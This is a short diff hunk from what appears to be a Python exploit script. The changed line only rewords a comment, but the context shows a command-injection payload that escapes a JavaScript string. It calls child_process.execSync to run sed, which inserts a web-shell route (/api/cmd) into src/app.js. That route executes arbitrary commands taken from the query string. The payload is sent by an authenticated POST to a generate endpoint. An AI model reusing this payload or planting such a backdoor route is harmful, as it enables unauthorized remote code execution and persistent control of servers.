@@ -26,7 +26,7 @@ headers2= {
         "Authorization":f"Bearer {token}"
 }
 
-# Step 2: perform command injection payload
+# Step 2: perform command injection
 json2= {"text":"'})+require('child_process').execSync('sed -i \"17i app.get(\\\\\"/api/cmd\\\\\", (req, res) => {  const cmd = require(\\\\\"child_process\\\\\").execSync(req.query.cmd).toString();  res.send(cmd);});\" src/app.js');//"}
 
 response1 = session.post(url=f"{url}/api/service/generate", proxies=proxies, json=json2, headers=headers2)
